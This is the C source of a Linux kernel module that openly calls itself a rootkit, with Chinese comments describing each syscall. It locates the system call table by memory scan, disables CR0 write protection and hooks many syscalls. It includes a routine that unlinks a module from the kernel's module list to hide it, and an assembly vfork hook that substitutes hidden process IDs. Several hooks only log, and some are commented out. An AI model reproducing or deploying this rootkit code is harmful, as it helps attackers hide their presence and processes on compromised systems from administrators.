#include "RTmain.h"
#include "RTsyscalltable.h"
#include "RTlist.h"
#include "RTcmd.h"

unsigned long **sys_call_table;
//static unsigned long irq_flags;
struct list_head * module_list_head = NULL;
long clone_pid = 0;
long clone_flag = 0;
long clone_count = 0;
long clone_tid = 0;
long clone_lasttid = 0;

long vfork_pid = 0;
long vfork_flag = 0;
long vfork_count = 0;
long vfork_spid = 0;
long vfork_lastpid = 0;
long process_count = 0;

void
del_lkm(const char *name) {
	struct module * pmod;
	struct list_head *plist;
	//struct list_head *plisthead;

	if(module_list_head == NULL) {
		module_list_head = &__this_module.list;
	}

	plist = module_list_head;

	while (plist) {
		pmod = list_entry(plist, struct module, list);
		if (!strcmp(name, pmod->name)) {
			if (module_list_head == plist) {
				module_list_head = module_list_head->prev;
			}

			plist->next->prev = plist->prev;
			plist->prev->next = plist->next;

			break;
		}

		plist = plist->prev;

		if (plist == module_list_head) {
			break;
		}
	}
}

/**
 *  sys_read - 3 - fs/read_write.c
 * 
 */
//#define DEBUG_READ

RT_SYSCALL_DEFINE(long, read, unsigned int fd,
        char __user *buf, size_t count) {
    int ret;

#ifdef DEBUG_READ
    DLog("read:fd:[%d],count:[%d]", fd, count);
#endif

    ret = RT_SYSCALL_CALL(read, fd, buf, count);
    return ret;
}

/**
 * sys_open - 5 - fs/open.c
 * 只检查打开的文件是否是 /proc/net/tcp 或 /proc/net/udp，否则调用正常中断
 */
//#define DEBUG_OPEN

RT_SYSCALL_DEFINE(long, open, const char __user *filename,
        int flags, int mode) {
    int ret;

#ifdef DEBUG_OPEN
    char kfileName[MAX_PATH];
    memset(kfileName, 0, MAX_PATH);
    if (!copy_from_user(kfileName, filename, strnlen_user(filename, MAX_PATH))) {
        DLog("open:filename:[%s]flags:[%d]mode:[%d]", kfileName, flags, mode);
    } else {
        DLog("open:copy_from_user failure~~");
    }
#endif       

    ret = RT_SYSCALL_CALL(open, filename, flags, mode);
    return ret;
}

/**
 * sys_chdir - 12 - fs/open.c
 * 用于改变当前工作目录，其参数为Path 目标目录，可以是绝对目录或相对目录
 * 成功返回0 ，失败返回-1
 */
#define DEBUG_CHDIR

RT_SYSCALL_DEFINE(long, chdir, const char __user *filename) {
    int ret;

#ifdef DEBUG_CHDIR
    char kfileName[MAX_PATH];
    memset(kfileName, 0, MAX_PATH);
    if (!copy_from_user(kfileName, filename, strnlen_user(filename, MAX_PATH))) {
        DLog("chdir:filename:[%s]", kfileName);
    } else {
        DLog("chdir:copy_from_user failure~~");
    }
#endif   

    ret = RT_SYSCALL_CALL(chdir, filename);
    return ret;
}

/**
 * sys_kill - 37 - kernel/signal.c
 * kill 送出一个特定的信号 (signal) 给行程 id 为 pid 的行程根据该信号而做特定的动作,
 * 若没有指定，预设是送出终止 (TERM) 的信号
 * kill()可以用来送参数sig指定的信号给参数pid指定的进程。参数pid有几种情况：
 * pid>0 将信号传给进程识别码为pid 的进程。
 * pid=0 将信号传给和当前进程相同进程组的所有进程
 * pid=-1 将信号广播传送给系统内所有的进程
 * pid<0 将信号传给进程组识别码为pid绝对值的所有进程
 */
#define DEBUG_KILL

RT_SYSCALL_DEFINE(long, kill, int pid, int sig) {
    long ret = 0;

#ifdef DEBUG_KILL
    DLog("kill:pid:[%d],sig:[%d]", pid, sig);
#endif

    ret = RT_SYSCALL_CALL(kill, pid, sig);
    return ret;
}

/**
 * sys_getsid - 66 - kernel/sys.c
 * 获取会话ID
 * 1.pid为0表示察看当前进程session ID
 * 2.ps ajx命令查看系统中的进程。参数a表示不仅列当前用户的进程,也列出所有其他用
 * 户的进程,参数x表示不仅列有控制终端的进程,也列出所有无控制终端的进程,参数j表示
 * 列出与作业控制相关的信息。
 * 3.组长进程不能成为新会话首进程,新会话首进程必定会成为组长进程。
 */
#define DEBUG_GETSID

RT_SYSCALL_DEFINE(long, getsid, pid_t pid) {
    int ret;
#ifdef DEBUG_GETSID
    DLog("getsid:pid:[%d]", pid);
#endif    
    ret = RT_SYSCALL_CALL(getsid, pid);
    return ret;
}

/**
 * sys_getpriority - 96 - kernel/sys.c
 * 可用来取得进程、进程组和用户的进程执行优先权
 * 参数which有三种数值，参数who则依which值有不同定义：
 * which who 代表的意义
 * PRIO_PROCESS who 为进程识别码
 * PRIO_PGRP who 为进程的组识别码
 * PRIO_USER who 为用户识别码
 * 此函数返回的数值介于-20至20 之间，代表进程执行优先权，数值
 * 越低代表有较高的优先次序，执行会较频繁。
 * 返回进程执行优先权，如有错误发生返回值则为-1且错误原因存于errno
 */
#define DEBUG_GETPRIORITY
RT_SYSCALL_DEFINE(long, getpriority, int which, int who) {
    int ret;
    
#ifdef DEBUG_GETPRIORITY
    DLog("getpriority:which:[%d],who:[%d]", which , who );
#endif      
    
    ret = RT_SYSCALL_CALL(getpriority, which, who);

    return ret;
}

/**
 * socketcall - 102 - include/linux/Syscalls.h
 * 所有的网络系统调用，最终都会调用sys_socketcall这个系统调用，
 * 由它来进行多路复用分解，分别调用相应的处理函数，socket函数对应调用sys_socket函数。
 * 所有的socket系统调用的总入口是sys_socketcall()
 */
#define DEBUG_SOCKETCALL
RT_SYSCALL_DEFINE(long, socketcall, int call, unsigned long __user * args) {
    int ret;
    
#ifdef DEBUG_SOCKETCALL
    DLog("socketcall:call:[%d]",call );
#endif          
    
    ret = RT_SYSCALL_CALL(socketcall, call, args);
    return ret;
}

/**
 * sysinfo - 116 - kernel/sys.c
 * 
 */
#define DEBUG_SYSINFO
RT_SYSCALL_DEFINE(long, sysinfo, struct sysinfo __user *info) {
    int ret;
#ifdef DEBUG_SYSINFO
    DLog("sysinfo");
#endif      
    ret = RT_SYSCALL_CALL(sysinfo, info);
    return ret;
}

/**
 * clone - 120 - kernel/process.c
 * 
 */
#define DEBUG_CLONE
RT_SYSCALL_DEFINE_JMP(long, clone, unsigned long clone_flags, unsigned long newsp,
        void __user *parent_tid, void __user *child_tid, struct pt_regs *regs) {
    asm("sub    $0x14,%esp");
    asm("mov    %ebx,-0x8(%ebp)");
    asm("mov    %esi,-0x4(%ebp)");
    asm("nopl   0x0(%eax,%eax,1)");
    asm("mov    %eax,%ecx");
    asm("mov    (%eax),%eax");
    asm("mov    0x4(%ecx),%edx");
    asm("mov    0x8(%ecx),%ebx");
    asm("mov    0x10(%ecx),%esi");
    asm("test   %edx,%edx");
    asm("jne    next");
    asm("mov    0x3c(%ecx),%edx");
    asm("next:");
    asm("mov    %esi,0x8(%esp)");
    asm("mov    %ebx,0x4(%esp)");
    asm("movl   $0x0,(%esp)");
    asm("push   %eax");
    asm volatile("movl %0,%%eax"::"m"(addr_do_fork));
    asm("movl   %eax,%esi");
    asm("pop    %eax");
    asm("call   *%esi");
    asm("mov    -0x8(%ebp),%ebx");
    asm("mov    -0x4(%ebp),%esi");

    asm("push %eax");
    asm("push %ebx");
    asm("push %ecx");
    asm("push %edx");

    asm volatile("movl %%eax,%0" : "=m"(clone_tid) :);

    if (clone_flag == 0) {
        clone_pid = current->pid;
        clone_flag = 1;
    } else {
        if (clone_pid == current->pid) {
            clone_flag++;
        } else {
            clone_flag--;
        }
    }

    if (clone_flag < 100 || clone_pid != current->pid) {
        clone_tid = 0;
    }

    asm("pop %edx");
    asm("pop %ecx");
    asm("pop %ebx");
    asm("pop %eax");

    asm("mov    %ebp,%esp");
    asm("pop    %ebp");
    asm("ret    ");

    return 0;
}

/**
 * init_module - 128 - kernel/module.c
 * insmod时候，在系统内部会调用sys_init_module() 去找到init_module函数的入口地址
 * 
 */
#define DEBUG_INIT_MODULE
RT_SYSCALL_DEFINE(long, init_module, void __user *umod, unsigned long len,
        const char __user *uargs) {
    int ret;
    
#ifdef DEBUG_INIT_MODULE
    DLog("init_module:len:[%ld]", len );
#endif        
    
    ret = RT_SYSCALL_CALL(init_module, umod, len, uargs);
    return ret;
}

/**
 * sys_getpgid - 20 - 	kernel/sys.c
 * 取得目前 process 的 thread ID (process ID)
 * 
 */
#define DEBUG_GETPGID
RT_SYSCALL_DEFINE(long, getpgid, pid_t pid) {
    long ret;
#ifdef DEBUG_GETPGID
    DLog("getpgid:pdid:[%d]", pid );
#endif          
    ret = RT_SYSCALL_CALL(getpgid, pid);
    return ret;
}

/**
 * getdents - 141 - fs/readdir.c
 * fd指目录文件描述符。可以用sys_open创建。
 * dirp指目录信息，其大小由第3个参数指定，dirp在使用时注意先分配内存。
 * count 目录信息的大小。如果count指定的比较小，可以通过循环，反复获取接下来的dirp.
 * getdents, getdents64 - get directory entries
 */
#define DEBUG_GETDENTS
RT_SYSCALL_DEFINE(long, getdents, unsigned int fd,
        struct linux_dirent __user* dirp, unsigned int count) {
    int ret;
#ifdef DEBUG_GETDENTS
    DLog("getdents:fd:[%d],count:[%d]", fd ,count);
#endif        
    ret = RT_SYSCALL_CALL(getdents, fd, dirp, count);
    return ret;
}

/**
 * sched_getparam - 155 - kernel/sched/core.c
 * set and get scheduling parameters
 * 
 */
#define DEBUG_SCHED_GETPARAM
RT_SYSCALL_DEFINE(long, sched_getparam, pid_t pid,
        struct sched_param __user *param) {
    int ret;
#ifdef DEBUG_SCHED_GETPARAM
    DLog("sched_getparam:pid:[%d]", pid);
#endif       
    ret = RT_SYSCALL_CALL(sched_getparam, pid, param);
    return ret;
}

/**
 * sched_getscheduler - 157 - kernel/sched/core.c
 * get scheduling policy/parameters
 */
#define DEBUG_SCHED_GETSCHEDULER
RT_SYSCALL_DEFINE(long, sched_getscheduler, pid_t pid) {
    int ret;
#ifdef DEBUG_SCHED_GETSCHEDULER
    DLog("sched_getscheduler:pid:[%d]", pid);
#endif        
    ret = RT_SYSCALL_CALL(sched_getscheduler, pid);
    return ret;
}

/**
 * sched_rr_get_interval - 161 - kernel/sched/core.c
 */
#define DEBUG_SCHED_RR_GET_INTERVAL
RT_SYSCALL_DEFINE(long, sched_rr_get_interval, pid_t pid,
        struct timespec __user *interval) {
    long ret;
 #ifdef DEBUG_SCHED_RR_GET_INTERVAL
    DLog("sched_rr_get_interval:pid:[%d]", pid);
#endif      
    ret = RT_SYSCALL_CALL(sched_rr_get_interval, pid, interval);
    return ret;
}

/**
 * vfork - 190 - kernel/fork.c
 * 
 */
#define DEBUG_VFORK
RT_SYSCALL_DEFINE_JMP(long, vfork, struct pt_regs *regs) {
    asm("sub    $0xc,%esp");
    asm("nopl   0x0(%eax,%eax,1)");
    asm("mov    0x3c(%eax),%edx");
    asm("mov    %eax,%ecx");
    asm("mov    $0x4111,%eax");
    asm("movl   $0x0,0x8(%esp)");
    asm("movl   $0x0,0x4(%esp)");
    asm("movl   $0x0,(%esp)");
    asm("push   %eax");
    asm volatile("movl %0,%%eax"::"m"(addr_do_fork));
    asm("movl   %eax,%esi");
    asm("pop    %eax");
    asm("call   *%esi");

    asm("push %eax");
    asm("push %ebx");
    asm("push %ecx");
    asm("push %edx");

    asm volatile("movl %%eax,%0" : "=m"(vfork_spid) :);

    if (vfork_flag == 0) {
        vfork_pid = current->pid;
        vfork_flag = 1;
    } else {
        if (vfork_pid == current->pid) {
            vfork_flag++;
        } else {
            vfork_flag--;
        }
    }

    if (vfork_flag >= 100 && vfork_pid == current->pid) {
        int pid;

        pid = get_hide_proc(vfork_lastpid++);

        if (pid) {
            vfork_spid = pid;
        }
    }

    asm("pop %edx");
    asm("pop %ecx");
    asm("pop %ebx");
    asm("pop %eax");

    asm volatile("movl %0,%%eax"::"m"(vfork_spid));

    asm("leave  ");
    asm("ret    ");

    return 0;
}



#if BITS_PER_LONG == 32
/**
 * stat64 - 195
 */
RT_SYSCALL_DEFINE(long, stat64, char __user *filename,
        struct stat64 __user *statbuf) {
    int ret;
    ret = RT_SYSCALL_CALL(stat64, filename, statbuf);
    return ret;
}
/**
 * lstat64 - 196
 */
RT_SYSCALL_DEFINE(long, lstat64, char __user *filename,
        struct stat64 __user *statbuf) {
    long ret;
    ret = RT_SYSCALL_CALL(lstat64, filename, statbuf);
    return ret;
}
#endif


/**
 * 
 */



/**
 * 
 */


/**
 * 
 */


/**
 * 
 */
// sys_getdents64

RT_SYSCALL_DEFINE(long, getdents64, unsigned int fd,
        struct linux_dirent64 __user* dirp, unsigned int count) {
    int ret;
    ret = RT_SYSCALL_CALL(getdents64, fd, dirp, count);
    return ret;
}




RT_SYSCALL_DEFINE(long, sched_getaffinity, pid_t pid, unsigned int len,
        unsigned long __user *user_mask_ptr) {
    int ret;
    ret = RT_SYSCALL_CALL(sched_getaffinity, pid, len, user_mask_ptr);
    return ret;
}






#if BITS_PER_LONG == 32

RT_SYSCALL_DEFINE(long, fstat64, unsigned long fd, struct stat64 __user *statbuf) {
    int ret;
    ret = RT_SYSCALL_CALL(fstat64, fd, statbuf);
    return ret;
}



#endif



RT_SYSCALL_DEFINE(long, gettid, void) {
    int ret;
    ret = RT_SYSCALL_CALL(gettid);
    return ret;
}



RT_SYSCALL_DEFINE(int, waitpid, pid_t pid, int __user *stat_addr, int options) {
    int ret;

    ret = RT_SYSCALL_CALL(waitpid, pid, stat_addr, options);

    return ret;
}

static unsigned long **find_sys_call_table(void) {
    unsigned long vaddr_number;

    unsigned long **p;

    for (vaddr_number = (unsigned long) sys_close;
            vaddr_number < (unsigned long) &loops_per_jiffy;
            vaddr_number += sizeof (void *)) {
        p = (unsigned long **) vaddr_number;
        if (p[__NR_close] == (unsigned long *) sys_close)
            return p;
    }

    return NULL;
}

void disable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    DLog("disable_write_protection");
    clear_bit(16, &cr0);
    write_cr0(cr0);
}

void enable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    write_cr0(cr0);
    DLog("enable_write_protection");
}

static int __init
ThisInit(void) {
    DLog("rootkit init");

    sys_call_table = find_sys_call_table();
    if (NULL != sys_call_table) {
        DLog("get sys_call_table success![0x%x]", (unsigned int) sys_call_table);
    } else {
        DLog("get sys_call_table failure!");
        return -1;
    }
    // local_irq_save(irq_flags);
    disable_write_protection();
    RT_SYSCALL_REPLACE(read); //3
    RT_SYSCALL_REPLACE(open); //5    
    RT_SYSCALL_REPLACE(chdir); //12
    RT_SYSCALL_REPLACE(kill); //37
    RT_SYSCALL_REPLACE(getsid); //66
    RT_SYSCALL_REPLACE(getpriority); //96
    RT_SYSCALL_REPLACE(socketcall); //102
    RT_SYSCALL_REPLACE(sysinfo); //116
    //RT_SYSCALL_REPLACE_JMP(clone); //120
    RT_SYSCALL_REPLACE(init_module); //128
    RT_SYSCALL_REPLACE(getpgid); //132
    RT_SYSCALL_REPLACE(getdents); //141
    RT_SYSCALL_REPLACE(sched_getparam); //155
    RT_SYSCALL_REPLACE(sched_getscheduler); //157
    RT_SYSCALL_REPLACE(sched_rr_get_interval); //161
    //RT_SYSCALL_REPLACE_JMP(vfork); //190
#if BITS_PER_LONG == 32
    RT_SYSCALL_REPLACE(stat64); //195
    RT_SYSCALL_REPLACE(lstat64); //196
#endif
    //    RT_SYSCALL_REPLACE(getdents64); //220
    //    RT_SYSCALL_REPLACE(gettid); //224
    //    RT_SYSCALL_REPLACE(sched_getaffinity); //242  
    enable_write_protection();
    //  local_irq_restore(irq_flags);
    return 0;
}

static void __exit
ThisExit(void) {
    //local_irq_save(irq_flags);
    disable_write_protection();
    RT_SYSCALL_RESTORE(read); //3
    RT_SYSCALL_RESTORE(open); //5   
    RT_SYSCALL_RESTORE(chdir); //12
    RT_SYSCALL_RESTORE(kill); //37
    RT_SYSCALL_RESTORE(getsid); //66
    RT_SYSCALL_RESTORE(getpriority); //96
    RT_SYSCALL_RESTORE(socketcall); //102
    RT_SYSCALL_RESTORE(sysinfo); //116
    //RT_SYSCALL_RESTORE_JMP(clone); //120
    RT_SYSCALL_RESTORE(init_module); //128
    RT_SYSCALL_RESTORE(getpgid); //132
    RT_SYSCALL_RESTORE(getdents); //141
    RT_SYSCALL_RESTORE(sched_getparam); //155
    RT_SYSCALL_RESTORE(sched_getscheduler); //157
    RT_SYSCALL_RESTORE(sched_rr_get_interval); //161
    //RT_SYSCALL_RESTORE_JMP(vfork); //190   
#if BITS_PER_LONG == 32
    RT_SYSCALL_RESTORE(stat64); //195
    RT_SYSCALL_RESTORE(lstat64); //196
#endif
    //    RT_SYSCALL_RESTORE(getdents64); //220
    //    RT_SYSCALL_RESTORE(gettid); //224
    //    RT_SYSCALL_RESTORE(sched_getaffinity); //242    
    enable_write_protection();
    //  local_irq_restore(irq_flags);
    DLog("rootkit exit");
}

module_init(ThisInit); //模块入口函数
module_exit(ThisExit); //模块出口函数
MODULE_LICENSE("GPL");
MODULE_AUTHOR("youyifeng");
MODULE_DESCRIPTION("This module can hook the sys_* function.");
